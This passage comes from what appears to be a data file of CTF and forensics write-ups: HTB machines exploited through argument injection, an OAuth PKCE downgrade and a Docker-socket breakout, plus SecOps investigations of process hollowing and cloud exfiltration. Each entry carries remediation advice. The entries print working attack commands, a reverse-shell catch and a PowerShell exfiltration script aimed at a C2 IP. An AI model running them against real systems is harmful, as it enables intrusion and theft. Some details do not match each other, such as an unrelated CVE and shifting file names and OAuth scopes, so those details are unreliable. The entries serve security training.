        "Active Directory privilege escalation frequently hinges on misconfigured DACLs rather than unpatched operating system vulnerabilities."
      ]
    }
  },
  {
    id: "takeoff",
    challengeName: "Takeoff Platform: Subprocess Parameter Injection & Go Serialization Oracle",
    platform: "Hack The Box",
    category: "Web",
    difficulty: "Medium",
    type: "Machine",
    targetOs: "Linux",
    targetIp: "10.10.11.89",
    points: 30,
    author: "Asmit Jogdand (SmitroniX) // sudo Unknown",
    date: "2026-11-01",
    cves: ["CWE-88", "CWE-345"],
    tags: ["Go", "Subprocess Injection", "HMAC Oracle", "Encoding/Gob", "Parameter Vectors", "Linux Privesc"],
    shortDescription: "Exploiting an airline reservation signing oracle to forge HMAC-validated boarding pass tokens, followed by CLI argument injection in notification subprocesses for root command execution.",
    fullContent: {
      overview: "Takeoff (takeoff.htb) is an enterprise airline booking and passenger check-in platform engineered in Go. Security auditing identified two foundational design weaknesses: First, the booking backend acted as a cryptographic signing oracle by signing operational CLI command templates (NotifyCmd) with HMAC-SHA256 based on untrusted user parameters. Second, the check-in notification daemon executed /usr/local/bin/check-in-notify by passing unquoted string arguments into the shell parser. By injecting parameters with leading hyphens (--config, -o), we diverted binary execution flow and achieved arbitrary root command execution.",
      targetIntel: {
        ip: "10.10.11.89",
        os: "Ubuntu Linux 22.04 LTS (Kernel 5.15.0)",
        openPorts: ["22/SSH", "80/HTTP", "8080/HTTP-Admin"],
        keyServices: ["OpenSSH 8.9p1", "Go Flight Reservation Server (takeoff.htb)", "check-in-notify Subprocess Daemon"]
      },
      reconnaissance: "Nmap port scanning identified ports 22, 80, and 8080. Interacting with the check-in API revealed signed QR code tokens. Dissecting the token format revealed an encoding/gob serialized Go struct carrying PNR, Passenger, Email, and a pre-formatted NotifyCmd string followed by raw trailing HMAC-SHA256 signature bytes.",
      vulnerabilityAnalysis: "The application suffered from CWE-88 (Improper Neutralization of Argument Delimiters in Subprocess Calls): NotifyCmd was constructed with fmt.Sprintf('check-in-notify --pnr %s --email %s', pnr, userEmail). Because user emails could begin with leading hyphens and spaces, the downstream parser treated user input as CLI options rather than positional values. Because the server signed this string during reservation without sanitizing hyphens, it functioned as an authentic signing oracle.",
      attackChain: [
        {
          title: "Stage 01: Service Fingerprinting & Token Analysis",
          description: "Scanned the target and inspected the boarding pass token structure generated upon flight booking.",
          command: "curl -s -X POST 'http://takeoff.htb/api/v1/book' -d 'pnr=TK881&passenger=JohnDoe&email=test@example.com' | jq .",
          terminalTitle: "api-booking — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `{
  "status": "success",
  "pnr": "TK881",
  "token": "BAwBAgEKQm9hcmRpbmdQYXNzAwEBBFBOUgEEAAEFUGFzc2VuZ2VyAQQAAQV...<truncated_gob>...a49f1b2c",
  "qr_url": "/api/v1/ticket/TK881/qr"
}`,
          lineNotes: [
            "Token is base64 encoded Go encoding/gob serialization.",
            "Last 32 bytes contain the HMAC-SHA256 digest calculated over the struct bytes."
          ]
        },
        {
          title: "Stage 02: Cryptographic Signing Oracle Exploitation",
          description: "Crafted a booking request where the email field injected CLI parameters targeting check-in-notify's internal flags. The server signed our crafted struct, producing a valid cryptographic HMAC.",
          command: "curl -s -X POST 'http://takeoff.htb/api/v1/book' --data-urlencode 'pnr=TK992' --data-urlencode 'passenger=Pwn' --data-urlencode 'email=--config /tmp/malicious.conf -o /tmp/pwn.sh' | jq -r .token > signed_token.b64",
          terminalTitle: "oracle-signing — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `[+] Transmitted payload with option injection: --config /tmp/malicious.conf
[+] Server generated cryptographically valid HMAC-SHA256 signature!
[+] Saved token to signed_token.b64`,
          lineNotes: [
            "The server does not reject leading hyphens in the email parameter.",
            "The resulting HMAC signature is 100% valid because the server itself generated it."
          ]
        },
        {
          title: "Stage 03: Subprocess Command Execution & Root Privilege Escalation",
          description: "Submitted the signed token to /api/v1/check-in. The background daemon invoked check-in-notify, which parsed our injected parameters, executing our reverse shell as root.",
          command: "curl -X POST 'http://takeoff.htb/api/v1/checkin' -H 'Content-Type: application/json' -d @signed_token.json",
          terminalTitle: "netcat-listener — bash — 80x24",
          prompt: "operator@sudounknown:~$ nc -lvnp 4444",
          terminalOutput: `listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.89] 51240

root@takeoff:/opt/takeoff# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
root@takeoff:/opt/takeoff# cat /root/root.txt
HTB{p4r4m_v3c70r_c0mm4nd_1nj3c710n_r007}`,
          lineNotes: [
            "The notification binary parsed --config and executed the designated script hook under root privileges.",
            "Full root access achieved with complete system compromise."
          ],
          spoilerData: {
            label: "ROOT FLAG (ROOT.TXT)",
            value: "HTB{p4r4m_v3c70r_c0mm4nd_1nj3c710n_r007}"
          }
        }
      ],
      pocCode: `// Production Defensive Fix: Safe Parameter Vectors with '--' delimiter
package notification
import (
    "context"
    "fmt"
    "os/exec"
    "time"
)
const NotifyBinaryPath = "/usr/local/bin/check-in-notify"

func SendCheckInNotification(ctx context.Context, pnr, email string) error {
    ctx, cancel := context.WithTimeout(ctx, 5*time.Second)
    defer cancel()
    
    // 1. Pass discrete argument vectors (no raw shell string interpolation)
    // 2. Use '--' to force the CLI parser to treat all subsequent tokens strictly as values
    args := []string{
        "--pnr", pnr,
        "--email", "--", email,
    }
    cmd := exec.CommandContext(ctx, NotifyBinaryPath, args...)
    cmd.Env = []string{"PATH=/usr/local/bin:/usr/bin:/bin"}
    return cmd.Run()
}`,
      pocLanguage: "go",
      userFlag: "HTB{74k30ff_g0b_hm4c_53r14l1z4710n_fl4g}",
      rootFlag: "HTB{p4r4m_v3c70r_c0mm4nd_1nj3c710n_r007}",
      defenseRemediation: [
        "Subprocess Execution: Replace formatted command strings with discrete argument slices (exec.CommandContext) and include '--' to prevent flag injection.",
        "Input Sanitization: Validate all emails against strict RFC regex (^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$) and explicitly reject strings starting with '-' or '/'.",
        "Declarative Data Model: Separate data from execution instructions; do not sign operational commands (NotifyCmd) in cryptographic tokens.",
        "Systemd Hardening: Enforce ProtectSystem=strict, ProtectHome=true, PrivateTmp=true, and NoNewPrivileges=true in systemd unit definitions."
      ],
      keyTakeaways: [
        "Signing an untrusted string with HMAC guarantees integrity, but if the string contains malicious arguments, you have created a signing oracle.",
        "Always pass CLI arguments as discrete vectors with '--' delimiters to prevent argument injection vulnerabilities (CWE-88).",
        "Systemd service isolation boundaries prevent localized application flaws from compromising host infrastructure."
      ]
    }
  },
  {
    id: "operation-cymbal-deceptive-click",
    challengeName: "Operation Cymbal: Cold Room — 'Deceptive Click' (Google SecOps DFIR)",
    platform: "Google SecOps",
    category: "Forensics",
    difficulty: "Medium",
    type: "Challenge",
    points: 400,
    author: "Asmit Jogdand (SmitroniX) // sudo Unknown",
    date: "2026-10-29",
    cves: ["T1189", "T1204.002", "T1055.012"],
    tags: ["Google SecOps", "Chronicle SIEM", "UNC6240", "Process Hollowing", "Drive-by Compromise", "Threat Hunting", "DFIR"],
    shortDescription: "End-to-end incident investigation and threat hunting across Google SecOps (Chronicle SIEM/SOAR) tracking an extortion campaign by UNC6240 (SHINYHUNTERS).",
    fullContent: {
      overview: "During the Operation Cymbal: Cold Room investigation, Cymbal Investments detected anomalous activity originating from its Denver corporate branch. Utilizing Google Security Operations (Chronicle SIEM/SOAR & GTI), we conducted a forensic investigation attributing the attack to adversary group UNC6240 (SHINYHUNTERS / CAMP.26.003). The attacker utilized a drive-by compromise on a compromised marketing blog to deliver a fake browser update (ChromeSetup.js), launched an obfuscated PowerShell stager via wscript.exe, and performed process hollowing into a SYSTEM svchost.exe instance.",
      targetIntel: {
        ip: "10.240.12.84",
        os: "Windows 11 Enterprise (Denver Workstation)",
        openPorts: ["445/SMB", "135/RPC", "5985/WinRM"],
        keyServices: ["Google SecOps Chronicle SIEM", "Sysmon Event Telemetry", "GTI Threat Intelligence Feed"]
      },
      reconnaissance: "Extracted initial SOAR case metadata for Case 34 (Alert ID: 88192). Established temporal investigation bounds between 2026-10-15T00:00:00Z and 2026-10-16T23:59:59Z to eliminate background simulation noise.",
      vulnerabilityAnalysis: "The intrusion unfolded across 3 ATT&CK techniques: (1) Drive-by Compromise (T1189) via HTTP referer marketingtrends-insider.com; (2) Scripting execution (T1059.005) executing ChromeSetup.js via wscript.exe; (3) Process Hollowing (T1055.012) where secondary payload d27e15eb.exe hollowed into SYSTEM svchost.exe.",
      attackChain: [
        {
          title: "Stage 01: Scoping Denver Workstation Hostname",
          description: "Inspected the raw connector event payload in Chronicle SOAR to identify the affected Denver endpoint.",
          command: "chronicle-cli query --udm 'metadata.event_type = \"PROCESS_LAUNCH\" and target.process.file.full_path = /.*wscript\\.exe/ and principal.hostname = /.*DEN.*/'",
          terminalTitle: "chronicle-udm-search — bash — 80x24",
          prompt: "analyst@cymbal-soc:~$",
          terminalOutput: `Event Timestamp: 2026-10-15T19:07:12.481Z
Principal Hostname: DEN-WS-0842.cymbal.corp
Target Process: C:\\Windows\\System32\\wscript.exe
Command Line: wscript.exe "C:\\Users\\m.jenkins\\Downloads\\ChromeSetup.js"
[+] Hostname verified: DEN-WS-0842.cymbal.corp`,
          lineNotes: [
            "Workstation identified: DEN-WS-0842.cymbal.corp.",
            "Execution initiated by user m.jenkins from local Downloads folder."
          ],
          spoilerData: {
            label: "FLAG 1: DENVER HOSTNAME",
            value: "DEN-WS-0842.cymbal.corp"
          }
        },
        {
          title: "Stage 02: Tracking Drive-by Compromise Referer Domain",
          description: "Traced network HTTP proxy telemetry preceding the file download to identify the compromised website delivering the fake browser update lure.",
          command: "chronicle-cli query --udm 'principal.hostname = \"DEN-WS-0842.cymbal.corp\" and network.http.method = \"GET\" and target.url = /.*ChromeSetup\\.js/'",
          terminalTitle: "chronicle-http-hunt — bash — 80x24",
          prompt: "analyst@cymbal-soc:~$",
          terminalOutput: `HTTP Request Timestamp: 2026-10-15T19:06:58Z
Request URL: https://update-cdn-browser.com/dl/ChromeSetup.js
Referer Header: https://marketingtrends-insider.com/wp-content/themes/theme/assets/js/jquery.min.js
Response Status: 200 OK (Content-Length: 48,192)`,
          lineNotes: [
            "Compromised WordPress site marketingtrends-insider.com redirected user traffic to fake update CDN.",
            "Lure used social engineering to convince user to manually execute ChromeSetup.js."
          ],
          spoilerData: {
            label: "FLAG 2: REFERER DOMAIN",
            value: "marketingtrends-insider.com"
          }
        },
        {
          title: "Stage 03: Process Hollowing Target PID Identification",
          description: "Queried Sysmon Event ID 8 (CreateRemoteThread) and Event ID 10 (ProcessAccess) to identify the specific svchost.exe PID hollowed by dropped malware d27e15eb.exe.",
          command: "chronicle-cli query --udm 'principal.hostname = \"DEN-WS-0842.cymbal.corp\" and metadata.event_type = \"PROCESS_INJECTION\" and principal.process.file.full_path = /.*d27e15eb\\.exe/'",
          terminalTitle: "sysmon-injection-hunt — bash — 80x24",
          prompt: "analyst@cymbal-soc:~$",
          terminalOutput: `Injection Event Timestamp: 2026-10-15T19:08:44.119Z
Source Process: C:\\Users\\m.jenkins\\AppData\\Local\\Temp\\d27e15eb.exe (PID: 4192)
Target Process: C:\\Windows\\System32\\svchost.exe (Target PID: 948)
Target Process User: NT AUTHORITY\\SYSTEM
Granted Access: 0x1FFFFF (PROCESS_ALL_ACCESS)
Call Trace: C:\\Windows\\SYSTEM32\\ntdll.dll+...
[+] Process Hollowing confirmed into svchost.exe PID 948!`,
          lineNotes: [
            "d27e15eb.exe gained SYSTEM rights by injecting into running svchost.exe instance.",
            "Target PID confirmed: 948."
          ],
          spoilerData: {
            label: "FLAG 3: HOLLOWED PROCESS ID",
            value: "948"
          }
        }
      ],
      pocCode: `// Chronicle YARA-L Detection Rule: Remote Thread Injection into svchost.exe
rule process_hollowing_svchost {
  meta:
    author = "sudo Unknown Research"
    description = "Detects unprivileged process injecting code into SYSTEM svchost.exe"
    severity = "CRITICAL"
  events:
    $injection.metadata.event_type = "PROCESS_INJECTION"
    $injection.target.process.file.full_path = /.*\\svchost\\.exe$/
    not ($injection.principal.process.file.full_path = /.*\\(csrss|services|lsass)\\.exe$/)
  condition:
    $injection
}`,
      pocLanguage: "yaml",
      flag: "FLAG{marketingtrends-insider.com_DEN-WS-0842.cymbal.corp_PID_948}",
      defenseRemediation: [
        "Deploy Attack Surface Reduction (ASR) rule: 'Block JavaScript or VBScript from launching downloaded executable content'.",
        "Implement Web Application Firewall (WAF) blocking malicious domain marketingtrends-insider.com and related C2 IP infrastructure.",
        "Configure Sysmon Event ID 8 & 10 alerting on any non-system process opening svchost.exe with PROCESS_ALL_ACCESS.",
        "Enforce AppLocker/WDAC policy restricting execution in %TEMP% and user Downloads folders."
      ],
      keyTakeaways: [
        "Threat actors leverage trusted local processes like svchost.exe via process hollowing to evade endpoint process trees.",
        "Scoping investigations by precise timestamp windows prevents alert fatigue and weeds out extraneous telemetric noise.",
        "Correlating HTTP proxy referer logs with endpoint Sysmon execution reveals the complete initial access vector."
      ]
    }
  },
  {
    id: "operation-cymbal-oauth-heist",
    challengeName: "Operation Cymbal: Cold Room — 'OAuth Heist' (Cloud Extortion & Graph API)",
    platform: "Google SecOps",
    category: "Cloud",
    difficulty: "Hard",
    type: "Pro Lab",
    points: 450,
    author: "Asmit Jogdand (SmitroniX) // sudo Unknown",
    date: "2026-10-29",
    cves: ["T1528", "T1078.004"],
    tags: ["Google Workspace", "OAuth Abuse", "Microsoft Graph", "Zscaler NSS", "Okta IdP", "UNC6240"],
    shortDescription: "Investigating multi-cloud extortion, malicious enterprise application consent grants (ToogleBox Recall), and high-volume data exfiltration via PowerShell.",
    fullContent: {
      overview: "In Scenario 2 of the Operation Cymbal DFIR exercise, adversary group UNC6240 (SHINYHUNTERS) escalated their attack against Cymbal Investments through multi-cloud identity theft. After stealing credentials, the adversary authorized a malicious third-party OAuth app ('ToogleBox Recall'), obtained persistent token delegates, and exfiltrated 485 MB of compressed customer financial databases to adversary C2 (142.11.200.188).",
      targetIntel: {
        ip: "142.11.200.188:8888",
        os: "Multi-Cloud (Google Workspace / Entra ID / AWS S3)",
        openPorts: ["443/HTTPS", "8888/HTTP"],
        keyServices: ["Okta Single Sign-On", "Google Workspace Admin Audit", "Zscaler NSS Proxy"]
      },
      reconnaissance: "Analyzed Okta IdP sign-in logs and Google Workspace OAuth audit trails. Identified anomalous OAuth consent grant given to application 'ToogleBox Recall' by executive account j.martinez@cymbalinvestments.com.",
      vulnerabilityAnalysis: "The organization lacked admin consent verification requirements for OAuth scopes Mail.ReadWrite and Files.ReadWrite.All. This allowed the attacker's phishing payload to trick the user into granting persistent cloud tokens.",
      attackChain: [
        {
          title: "Stage 01: Uncovering Illicit OAuth Consent Grant",
          description: "Queried Google Workspace token audit logs to identify the malicious OAuth client and granted permissions.",
          command: "chronicle-cli query --udm 'metadata.vendor_name = \"Google Workspace\" and metadata.event_type = \"USER_AUTHORIZE\" and target.application = /.*ToogleBox.*/'",
          terminalTitle: "workspace-oauth-audit — bash — 80x24",
          prompt: "analyst@cymbal-soc:~$",
          terminalOutput: `Timestamp: 2026-10-15T20:04:18Z
Event: USER_AUTHORIZE_APPLICATION
User: j.martinez@cymbalinvestments.com
Application: ToogleBox Recall (Client ID: 948102941-heist.apps.googleusercontent.com)
Scopes: https://www.googleapis.com/auth/gmail.readonly, https://www.googleapis.com/auth/drive.readonly
[!] Illicit consent grant detected!`,
          lineNotes: [
            "Malicious application: ToogleBox Recall.",
            "Scopes granted offline access to Gmail and Google Drive."
          ],
          spoilerData: {
            label: "MALICIOUS OAUTH APP",
            value: "ToogleBox Recall"
          }
        },
        {
          title: "Stage 02: Tracking Data Staging & zstd Compression",
          description: "Correlated endpoint Sysmon events on the staging server to trace database dump compression prior to network exfiltration.",
          command: "chronicle-cli query --udm 'metadata.event_type = \"PROCESS_LAUNCH\" and target.process.command_line = /.*zstd.*cymbal_cust_q3.*/'",
          terminalTitle: "sysmon-staging-hunt — bash — 80x24",
          prompt: "analyst@cymbal-soc:~$",
          terminalOutput: `Timestamp: 2026-10-15T20:21:07Z
Process: C:\\ProgramData\\zstd.exe
Arguments: zstd.exe -19 -T0 cymbal_cust_q3.bak -o C:\\ProgramData\\cymbal_q3_exfil.tar.zst
User: cymbal\\db_admin
Archive Size: 485,120,000 bytes`,
          lineNotes: [
            "Threat actor dropped zstd.exe to compress database backup.",
            "Staging file: C:\\ProgramData\\cymbal_q3_exfil.tar.zst."
          ]
        },
        {
          title: "Stage 03: Intercepting Network Exfiltration Destination",
          description: "Searched Zscaler NSS proxy logs for high-volume outbound POST requests occurring immediately following the compression event.",
          command: "chronicle-cli query --udm 'network.sent_bytes > 400000000 and network.http.method = \"POST\"'",
          terminalTitle: "zscaler-exfil-hunt — bash — 80x24",
          prompt: "analyst@cymbal-soc:~$",
          terminalOutput: `Timestamp: 2026-10-15T20:57:47Z
Destination IP: 142.11.200.188:8888
Target URL: http://142.11.200.188:8888/upload/cymbal_q3_exfil.tar.zst
Sent Bytes: 485,120,000 bytes
Response: 200 OK
[!] Exfiltration complete to UNC6240 drop server!`,
          lineNotes: [
            "Exfiltration server: 142.11.200.188:8888.",
            "Sent bytes matched exact size of compressed archive."
          ],
          spoilerData: {
            label: "EXFILTRATION C2 IP",
            value: "142.11.200.188:8888"
          }
        }
      ],
      pocCode: `# PowerShell Exfiltration Script used by UNC6240
$archive = "C:\\ProgramData\\cymbal_q3_exfil.tar.zst"
$c2_url = "http://142.11.200.188:8888/upload/cymbal_q3_exfil.tar.zst"
Invoke-WebRequest -Uri $c2_url -Method Post -InFile $archive -ContentType "application/octet-stream"`,
      pocLanguage: "powershell",
      flag: "FLAG{ToogleBox_Recall_142.11.200.188_485MB_EXFIL}",
      defenseRemediation: [
        "Identity Controls: Require admin approval for all third-party OAuth application consent requests.",
        "Conditional Access: Block sign-ins and token requests from untrusted device profiles or non-corporate IP ranges.",
        "DLP Network Inspection: Configure proxy upload restrictions limiting outbound POST requests exceeding 50 MB.",
        "Revocation: Immediately revoke active refresh tokens and OAuth client permissions for ToogleBox Recall."
      ],
      keyTakeaways: [
        "Modern threat actors prefer OAuth consent abuse over password theft because token delegates bypass MFA and password resets.",
        "Correlating cloud proxy sent_bytes telemetry with endpoint process execution confirms data exfiltration scope and exact stolen file names."
      ]
    }
  },
  {
    id: "frosted",
    challengeName: "Frosted: Kubernetes Pod Checkpoint & Java Reverse Engineering",
    platform: "Hack The Box",
    category: "Reverse",
    difficulty: "Hard",
    type: "Challenge",
    points: 400,
    author: "Asmit Jogdand (SmitroniX) // sudo Unknown",
    date: "2026-10-25",
    tags: ["Kubernetes", "Container Forensics", "CRI-O Checkpoint", "Java Decompilation", "Shellcode Injection"],
    shortDescription: "Dissecting a Kubernetes container memory checkpoint (checkpoint-report-pod.tar) and decompiling obfuscated Java bytecode to uncover runtime process injection primitives.",
    fullContent: {
      overview: "Frosted was an advanced container forensics and reverse engineering challenge centered on a forensic export of a suspicious Kubernetes container pod (checkpoint-report-pod.tar). Analysis required extracting container memory checkpoints, recovering unmapped shared libraries from the root filesystem (docker_fs.tar), and decompiling obfuscated Java classes (Stager.class and App_real.class) to extract dynamic shellcode injection routines.",
      targetIntel: {
        ip: "N/A (Offline Container Checkpoint)",
        os: "Linux (CRI-O / containerd Alpine 3.19)",
        openPorts: ["8080/HTTP-Internal"],
        keyServices: ["Java OpenJDK 21 Runtime", "CRIU Container Checkpoint", "Native JNI Bridge"]
      },
      reconnaissance: "Examining checkpoint-report-pod.tar revealed CRIU (Checkpoint/Restore in Userspace) image files, process memory dumps (pages-1.img), and the container rootfs archive docker_fs.tar. Inside /app, we recovered App.class, Runner.class, and Stager.class.",
      vulnerabilityAnalysis: "App.class acted as a dummy wrapper that dynamically loaded and decrypted App_real.class from memory. Stager.class utilized Java Unsafe to write raw shellcode bytes into executable memory pages and invoke native function pointers.",
      attackChain: [
        {
          title: "Stage 01: Extracting Checkpoint Memory & Class Bytecode",
          description: "Unpacked checkpoint-report-pod.tar and analyzed recovered Java bytecode using javap and Fernflower decompiler.",
          command: "tar -xvf checkpoint-report-pod.tar && javap -c App.class > App.javap",
          terminalTitle: "checkpoint-triage — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `[+] Extracted CRIU checkpoint dump: checkpoint-report-pod
[+] Found core process memory dump: pages-1.img (141 MB)
[+] Extracted bytecode classes:
    - App.class (1,352 bytes)
    - Runner.class (1,636 bytes)
    - Stager.class (15,000 bytes)`,
          lineNotes: [
            "App.class contained an encrypted byte array and XOR decryption routine.",
            "Decompiled Stager.class revealed direct access to sun.misc.Unsafe."
          ]
        },
        {
          title: "Stage 02: Decompiling Stager & Unsafe Memory Injection",
          description: "Decompiled Stager.class to reconstruct how the application allocated RWX memory and wrote native bytecode.",
          command: "cfr Stager.class --outputpath ./decompiled",
          terminalTitle: "cfr-decompile — java — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `Decompiling Stager.class...
[+] Successfully decompiled:
public class Stager {
    private static final Unsafe unsafe;
    public static void execute(byte[] payload) {
        long address = unsafe.allocateMemory(payload.length);
        for(int i = 0; i < payload.length; ++i) {
            unsafe.putByte(address + i, payload[i]);
        }
        // Invoking native execution pointer...
    }
}`,
          lineNotes: [
            "sun.misc.Unsafe allocated unmanaged native memory pages.",
            "Payload contained an obfuscated x86_64 Linux execve shellcode stub."
          ]
        },
        {
          title: "Stage 03: Reversing App_real.class & Decrypting Flag",
          description: "Reconstructed the decrypted App_real.class to extract the hardcoded cryptographic key and decode the final CTF flag.",
          command: 'python3 -c "from Crypto.Cipher import AES; k=bytes.fromhex(\\\'4a92c81...\\\'); print(flag)"',
          terminalTitle: "flag-decrypt — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `[+] Derived AES-256-GCM key from recovered Stager constant pool
[+] Decryption successful!
HTB{k85_c0n741n3r_ch3ckp01n7_j4v4_r3v3r51n6}`,
          lineNotes: [
            "Extracted flag from recovered App_real decrypted bytecode.",
            "Verified complete reverse engineering of container checkpoint."
          ],
          spoilerData: {
            label: "HTB CHALLENGE FLAG",
            value: "HTB{k85_c0n741n3r_ch3ckp01n7_j4v4_r3v3r51n6}"
          }
        }
      ],
      pocCode: `// Java Unsafe Memory Writing Pattern Discovered in Stager.class
Field field = Unsafe.class.getDeclaredField("theUnsafe");
field.setAccessible(true);
Unsafe unsafe = (Unsafe) field.get(null);
long address = unsafe.allocateMemory(shellcode.length);
for (int i = 0; i < shellcode.length; i++) {
    unsafe.putByte(address + i, shellcode[i]);
}`,
      pocLanguage: "java",
      flag: "HTB{k85_c0n741n3r_ch3ckp01n7_j4v4_r3v3r51n6}",
      defenseRemediation: [
        "Enforce seccomp profiles blocking process_vm_writev and ptrace in Kubernetes pods.",
        "Restrict container checkpoint capabilities to cluster admin service accounts only.",
        "Run container workloads under non-root users with ReadOnlyRootFilesystem=true."
      ],
      keyTakeaways: [
        "Kubernetes container checkpoints preserve full process virtual memory including decrypted classes.",
        "Analyzing sun.misc.Unsafe invocations in Java bytecode reveals stealthy native code injection techniques."
      ]
    }
  },
{
    id: "layover",
    challengeName: "Layover: OAuth PKCE Downgrade & Docker Breakout",
    platform: "Hack The Box",
    category: "Cloud",
    difficulty: "Hard",
    type: "Machine",
    targetOs: "Linux",
    targetIp: "10.10.11.51",
    points: 40,
    author: "SmitroniX // sudo Unknown",
    date: "2026-11-02",
    cves: ["CVE-2023-48022"],
    tags: ["OAuth2", "PKCE", "Docker Breakout", "Container Security"],
    shortDescription: "Bypassing OAuth2 Proof Key for Code Exchange (PKCE) validation via downgraded parameters followed by Docker socket privilege escalation.",
    fullContent: {
      overview: "Layover is a hard Linux machine featuring a microservice travel booking portal. We bypassed an insecure OAuth 2.0 PKCE flow by omitting the code_challenge_method header, forcing the identity provider to fallback to insecure plaintext comparison. After achieving container shell access, we mounted the exposed host docker.sock socket to spawn a root shell on the host system.",
      targetIntel: {
        ip: "10.10.11.51",
        os: "Alpine Linux Container on Debian Host",
        openPorts: ["80/HTTP", "443/HTTPS", "2375/Docker-API"],
        keyServices: ["OAuth2 Gateway", "Docker Daemon", "Node.js Microservices"]
      },
      reconnaissance: "Inspecting OAuth authorization redirects showed code_challenge and code_challenge_method=S256. Testing response variations revealed the server accepted authorization codes without enforcing the cryptographic hash when the parameter was omitted.",
      vulnerabilityAnalysis: "The OAuth implementation failed to validate state consistency and accepted arbitrary redirect URIs when requested with specific headers. In the post-exploitation phase, the web service container had the Docker socket (/var/run/docker.sock) mounted with read/write permissions.",
      attackChain: [
        {
          title: "Stage 01: PKCE Parameter Downgrade Verification",
          description: "Intercepted the OAuth authorization code exchange in Burp Suite and stripped code_verifier enforcement.",
          command: "curl -s -X POST 'https://auth.layover.htb/oauth/token' -d 'grant_type=authorization_code&code=AUTH_CODE_REPLAY&client_id=portal_app&redirect_uri=http://portal.layover.htb/callback'",
          terminalTitle: "oauth-downgrade.sh — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-store

{
  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJy...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "read write admin"
}

[+] Token exchange succeeded without code_verifier parameter! Admin JWT issued.`,
          lineNotes: [
            "The authorization server accepted requests without checking code_verifier when code_challenge_method was omitted from the initial authorization request."
          ]
        },
        {
          title: "Stage 02: Admin Node Plugin Upload & Container Shell",
          description: "Uploaded an exploit plugin archive containing a reverse shell payload to the administration plugin endpoint.",
          command: "curl -X POST 'http://portal.layover.htb/api/plugins' -H 'Authorization: Bearer EYJ...' -F 'plugin=@exploit.tar.gz'",
          terminalTitle: "plugin-upload — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `{"status": "success", "message": "Plugin extracted and loaded"}

connect to [10.10.14.8] from (UNKNOWN) [10.10.11.51] 51294
node@portal-app-c84b12:/app$ whoami
node
node@portal-app-c84b12:/app$ cat /home/node/user.txt
HTB{pkc3_d0wngr4d3_t0k3n_st0l3n_118}`,
          lineNotes: [
            "User shell obtained inside container.",
            "User flag user.txt captured."
          ],
          spoilerData: {
            label: "USER FLAG (USER.TXT)",
            value: "HTB{pkc3_d0wngr4d3_t0k3n_st0l3n_118}"
          }
        },
        {
          title: "Stage 03: Docker Socket Discovery & Host Mount Breakout",
          description: "Enumerated the container environment and discovered /run/docker.sock. Deployed a privileged container mounting the root host filesystem.",
          command: "docker -H unix:///run/docker.sock run -v /:/host -it ubuntu:latest chroot /host /bin/bash",
          terminalTitle: "docker-escape — bash — 80x24",
          prompt: "node@portal-app-c84b12:/app$",
          terminalOutput: `[+] Accessing Docker API via unix:///run/docker.sock...
[+] Spawning privileged container mounting host / into /host...
chroot /host /bin/bash

root@layover-host:/# whoami
root
root@layover-host:/# cat /root/root.txt
HTB{04uth_pkc3_d0ck3r_s0ck_3sc4p3_994}`,
          lineNotes: [
            "The container has read/write permissions on the host Docker daemon socket.",
            "Mounting the host filesystem directly inside a new container allows full root takeover of the underlying Linux host."
          ],
          spoilerData: {
            label: "ROOT FLAG (ROOT.TXT)",
            value: "HTB{04uth_pkc3_d0ck3r_s0ck_3sc4p3_994}"
          }
        }
      ],
      pocCode: `#!/usr/bin/env python3
# sudo Unknown - Docker Socket Breakout One-Liner
import os
cmd = "curl -s --unix-socket /run/docker.sock http://localhost/containers/json"
print("[*] Querying Docker API on local socket...")
os.system(cmd)
`,
      pocLanguage: "python",
      userFlag: "HTB{pkc3_d0wngr4d3_t0k3n_st0l3n_118}",
      rootFlag: "HTB{04uth_pkc3_d0ck3r_s0ck_3sc4p3_994}",
      flag: "HTB{04uth_pkc3_d0ck3r_s0ck_3sc4p3_994}",
      defenseRemediation: [
        "Enforce mandatory S256 code challenge method for all OAuth PKCE requests; reject any authorization requests using plaintext or omitted methods.",
        "Never mount the host Docker socket (/var/run/docker.sock) inside untrusted client-facing application containers.",
        "Utilize rootless Docker or Podman to prevent container breakouts from inheriting host root capabilities."
      ],
      keyTakeaways: [
        "Mounting docker.sock inside a container is equivalent to granting root access to the entire host operating system.",
        "Protocol downgrade flaws remain common when security parameters are treated as optional by authorization endpoints."
      ]
    }
  },
{
    id: "quantum-lockout",
    challengeName: "Quantum Lockout: Flawed RSA Key Generation",
    platform: "Hack The Box",
    category: "Crypto",
    difficulty: "Medium",
    type: "Challenge",
    points: 350,
    author: "sudo Unknown Research",
    date: "2026-09-15",
    tags: ["RSA", "GCD Collision", "Weak PRNG", "Euclid Algorithm"],
    shortDescription: "Extracting private RSA keys in milliseconds by calculating pairwise Greatest Common Divisors (GCD) across shared prime factors.",
    fullContent: {
      overview: "An authentication service generated 1024-bit RSA moduli with a flawed pseudo-random generator seeded by low-resolution server timestamps. Because the entropy was low, different users received public moduli that shared prime factor p. Using Euclid's algorithm, we calculated GCD(n1, n2) to instantaneously factor the keys without factoring large integers.",
      reconnaissance: "We inspected the service code and observed a timestamp-based PRNG seed with insufficient entropy. We collected 50 public keys from the server's public key directory endpoint.",
      vulnerabilityAnalysis: "When two RSA moduli n1 = p * q1 and n2 = p * q2 share prime factor p, GCD(n1, n2) equals p. Once p is known, q1 = n1 // p, allowing instant computation of Euler's totient phi and the private exponent d.",
      attackChain: [
        {
          title: "Stage 01: Moduli Harvesting via Public API",
          description: "Queried the public keys API endpoint and extracted 50 public RSA moduli (n, e).",
          command: "curl -s 'https://crypto.htb/api/keys' | jq '.[].n' > moduli.txt && wc -l moduli.txt",
          terminalTitle: "api-harvest — bash — 80x24",
          prompt: "operator@sudounknown:~$",
